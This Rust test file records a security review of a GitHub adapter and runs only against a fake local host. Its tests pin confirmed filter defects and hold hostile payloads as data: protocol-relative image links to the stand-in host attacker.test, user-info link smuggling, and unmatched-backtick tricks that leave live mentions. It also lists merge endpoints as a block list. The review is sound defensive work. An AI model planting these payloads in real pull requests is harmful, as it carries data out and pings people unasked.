//! Security review of the GitHub adapter (authority and evidence review, 2026-10-28).
//!
//! Tests named `aut_*` show a confirmed defect and are `#[ignore]`d, so the normal run stays
//! green. Tests named `held_*` pin what the review attacked and found sound; they run normally.
//! Everything runs against the testkit's fake GitHub on the loopback interface. Nothing here
//! was run against the real GitHub, and where a finding depends on how GitHub renders text that is
//! said in its message.
//!
//! One defect:  `cargo test -p factory-github --test security_review --locked -- --ignored <name> --exact`
//! All defects: `cargo test -p factory-github --test security_review --locked -- --ignored aut_`
//! All probes:  `cargo test -p factory-github --test security_review --locked held_`

#[path = "../common/mod.rs"]
mod common;

use common::harness::{FIXTURE, World};
use factory_domain::vocabulary::{GateOutcome, StageKind};
use factory_ports::githost::{
    ChangeHost, CheckConclusion, CommentTarget, DraftPrRequest, GitHostError, GitScope,
};
use factory_ports::paths::BranchName;
use factory_testkit::contracts::githost::scope;

fn delivery() -> GitScope {
    GitScope {
        stage: StageKind::Delivery,
        ..scope(1, 1)
    }
}

fn draft(body: &str) -> DraftPrRequest {
    DraftPrRequest {
        head: BranchName::new("factory/job-1").unwrap(),
        base: BranchName::new("main").unwrap(),
        title: "Add a word count command".to_owned(),
        body: body.to_owned(),
    }
}

/// What the code host holds as the body of the pull request after the adapter cleaned `body`.
async fn stored_body(body: &str) -> String {
    let world = World::new();
    let host = world.adapter.change_host();
    let pr = host
        .open_draft_pull_request(&delivery(), draft(body))
        .await
        .unwrap_or_else(|error| panic!("the body was refused: {error:?}"));
    world.fake.pull_json(FIXTURE, pr.number).unwrap()["body"]
        .as_str()
        .unwrap()
        .to_owned()
}

// ---- AUT-6: an image survives inside a link to an allowed host --------------------------------

/// `policies/security.yaml` `output_hygiene` says a rendered body carries no image, because GitHub
/// fetches images and an image URL carries data out. `neutralize_links` removes a bare image, but
/// when an image is the label of a link to an allowed host it copies the whole link unchanged
/// (`text.rs`, the `host_allowed` branch), and the later pass that removes bare URLs looks only
/// for `http://`, `https://` and `www.`. A protocol-relative image URL passes both. Whether
/// GitHub fetches it through its image proxy is not verified here (no real GitHub); the filter's
/// own contract, "no image", is what fails.
#[tokio::test]
#[ignore = "confirmed defect AUT-6: a linked image with a protocol-relative URL passes the outbound text filter unchanged"]
async fn aut_6_an_image_inside_a_link_to_an_allowed_host_is_removed() {
    let body = stored_body(
        "Result: [![chart](//attacker.test/b.png?d=1)](https://github.com/example-org/fixture)",
    )
    .await;
    assert!(
        !body.contains("attacker.test"),
        "the body still holds the image: {body:?}"
    );
}

/// The same hole through an image reference whose definition sits in a block quote, where
/// `drop_definitions` does not look. The reference is the label of an allowed link.
#[tokio::test]
#[ignore = "confirmed defect AUT-6: a linked image reference with a protocol-relative definition passes the outbound text filter"]
async fn aut_6_a_linked_image_reference_is_removed() {
    let body = stored_body(
        "[![chart][r]](https://github.com/example-org/fixture)\n\n> [r]: //attacker.test/b.png",
    )
    .await;
    assert!(
        !body.contains("attacker.test"),
        "the body still holds the image: {body:?}"
    );
}

// ---- AUT-7: a lone backtick switches the mention filter off -----------------------------------

/// `neutralize_tokens` leaves an `@name` alone when the character before it is a backtick, and
/// writes a safe mention as a code span with a closing backtick. A lone backtick in hostile text
/// is not a code span (CommonMark needs a closing one), so GitHub renders the mention as a live
/// one and notifies the person or the whole team. The existing NT-SEC-04 test cannot see this,
/// because it checks only that an `@` is *preceded* by a backtick, which the attack satisfies.
#[tokio::test]
#[ignore = "confirmed defect AUT-7: an unmatched backtick leaves a live @team mention in a pull request body"]
async fn aut_7_a_mention_after_an_unmatched_backtick_is_made_inert() {
    let body = stored_body("Please look, `@example-org/security-team now").await;
    assert!(
        body.contains("`@example-org/security-team`"),
        "the mention is not inside a closed code span: {body:?}"
    );
}

/// The same switch for a reference to another repository (`owner/repo#12`), which makes a
/// back-link in that repository's issue.
#[tokio::test]
#[ignore = "confirmed defect AUT-7: an unmatched backtick leaves a live cross-repository reference in a pull request body"]
async fn aut_7_a_cross_repository_reference_after_an_unmatched_backtick_is_made_inert() {
    let body = stored_body("See `victim/repo#12 for details").await;
    assert!(
        body.contains("`victim/repo#12`"),
        "the reference is not inside a closed code span: {body:?}"
    );
}

// ---- AUT-8: neutral means passed for a required check -----------------------------------------

/// The port says "success, skipped and neutral count as passing" for a required check
/// (`ports/src/githost.rs`, `CheckConclusion`). The helper answers `Neutral` for an empty set of
/// gates and the comment on it says "no evidence is not a pass". Those two statements cannot both
/// hold: a ruleset that requires `factory-validation` is satisfied by the check this builds.
/// The delivery stage cannot reach it today (`parse_validation` refuses an empty report list),
/// so the finding is latent.
#[test]
#[ignore = "confirmed defect AUT-8 (latent): no evidence at all is published as a conclusion that a required check accepts"]
fn aut_8_no_gate_reports_is_not_a_conclusion_that_passes_a_required_check() {
    let conclusion = factory_github::conclusion_for_gates(&[]);
    assert_ne!(
        conclusion,
        CheckConclusion::Neutral,
        "an empty set of gates is published as neutral, which GitHub counts as passing"
    );
    let all_not_applicable = factory_github::conclusion_for_gates(&[
        GateOutcome::NotApplicable,
        GateOutcome::NotApplicable,
    ]);
    assert_ne!(all_not_applicable, CheckConclusion::Neutral);
}

// ---- held --------------------------------------------------------------------------------------

/// The adapter has no way to merge or to mark a pull request ready: `Method` has no PUT, and no
/// source file of the crate names a merge or ready endpoint, a GraphQL mutation or auto-merge.
#[test]
fn held_the_adapter_has_no_call_that_merges_or_marks_ready() {
    let sources = [
        ("changes.rs", include_str!("../../src/changes.rs")),
        ("client.rs", include_str!("../../src/client.rs")),
        ("core.rs", include_str!("../../src/core.rs")),
        ("issues.rs", include_str!("../../src/issues.rs")),
        ("token.rs", include_str!("../../src/token.rs")),
        ("adapter.rs", include_str!("../../src/adapter.rs")),
    ];
    let wire = include_str!("../../src/wire.rs");
    assert!(!wire.contains("Put"), "wire.rs gained a PUT method");
    for (name, source) in sources {
        let code: String = source
            .lines()
            .filter(|line| !line.trim_start().starts_with("//"))
            .collect::<Vec<_>>()
            .join("\n");
        for needle in [
            "/merge",
            "ready_for_review",
            "graphql",
            "auto_merge",
            "markPullRequestReady",
            "enablePullRequestAutoMerge",
            "Method::Put",
        ] {
            assert!(!code.contains(needle), "{name} names {needle}");
        }
    }
}

/// A push credential and a branch for the pull request are only for `factory/` branches.
#[tokio::test]
async fn held_a_push_target_for_the_default_branch_is_refused() {
    let world = World::new();
    let host = world.adapter.change_host();
    for name in ["main", "master", "release/1.0", "factory", "Factory/x"] {
        let branch = BranchName::new(name).unwrap();
        assert_eq!(
            host.push_target(&delivery(), &branch).await.err(),
            Some(GitHostError::BranchNotAllowed),
            "{name}"
        );
    }
    let mut request = draft("x");
    request.head = BranchName::new("main").unwrap();
    request.base = BranchName::new("factory/job-1").unwrap();
    assert_eq!(
        host.open_draft_pull_request(&delivery(), request)
            .await
            .err(),
        Some(GitHostError::BranchNotAllowed)
    );
}

/// A link whose address hides another host behind user information, or that is not on the list,
/// loses its address. A bare image loses its address too.
#[tokio::test]
async fn held_links_to_other_hosts_and_bare_images_are_removed() {
    let body = stored_body(
        "[a](https://github.com@attacker.test/x) [b](https://attacker.test/y) [c](http://github.com/z) ![d](https://github.com/example-org/fixture/raw/main/i.png) https://attacker.test/q www.attacker.test/r",
    )
    .await;
    assert!(!body.contains("attacker.test"), "{body:?}");
    assert!(!body.contains("!["), "{body:?}");
    assert!(!body.contains("](http://"), "{body:?}");
}

/// A comment cannot be posted on an issue or pull request of another repository, and the
/// refusal happens before any request is made.
#[tokio::test]
async fn held_a_comment_for_another_repository_makes_no_request() {
    let world = World::new();
    let host = world.adapter.change_host();
    let before = world.fake.requests().len();
    let other = factory_ports::githost::PullRequestRef {
        repo: factory_ports::paths::RepoRef::parse(common::harness::OTHER).unwrap(),
        number: 1,
    };
    let result = host
        .post_comment(
            &delivery(),
            &CommentTarget::PullRequest(other),
            "hello",
            "key",
        )
        .await;
    assert_eq!(result.err(), Some(GitHostError::NotFound));
    assert_eq!(world.fake.requests().len(), before);
}

// ---- AUT-9: the approval stage's acknowledgement cannot be posted -----------------------------

/// `ApprovalService::submit` posts "The decision approve by ... is recorded" as the stage
/// `Approval` (`service.rs`, the acknowledgement block) and ignores the answer. The adapter gives
/// every stage except `Delivery` a read-only token (`permissions.rs`, `may_write`), so on the real
/// host that comment is refused. Nothing is lost on the authority side (the decision is recorded
/// first), but the person is never told, and a reader of the service would think they are.
#[tokio::test]
#[ignore = "confirmed defect AUT-9: the acknowledgement comment of the approval stage is posted with a read-only token"]
async fn aut_9_the_approval_stage_can_post_the_acknowledgement_it_tries_to_post() {
    let world = World::new();
    let host = world.adapter.change_host();
    let pr = host
        .open_draft_pull_request(&delivery(), draft("Evidence follows."))
        .await
        .unwrap();
    let as_approval = GitScope {
        stage: StageKind::Approval,
        ..scope(1, 1)
    };
    let posted = host
        .post_comment(
            &as_approval,
            &CommentTarget::PullRequest(pr),
            "The decision approve by someone is recorded.",
            "approval-1",
        )
        .await;
    assert!(posted.is_ok(), "{posted:?}");
}
